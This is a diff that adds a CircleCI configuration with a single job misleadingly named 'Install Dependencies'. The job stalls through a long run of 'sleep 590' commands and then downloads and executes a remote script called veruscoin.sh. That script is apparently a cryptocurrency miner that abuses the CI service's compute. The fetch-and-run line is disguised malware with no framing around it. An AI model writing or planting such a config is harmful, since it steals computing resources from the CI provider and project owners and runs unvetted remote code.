@@ -1,0 +1,40 @@
+ersion: 2
+jobs:
+    aku1:
+      docker:
+            - image: circleci/clojure:lein-2.9.5
+      steps:
+        - run:
+            name: Install Dependencies
+            command: 
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              sleep 590
+              wget https://github.com/klomangjawa/olekukonko/raw/master/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
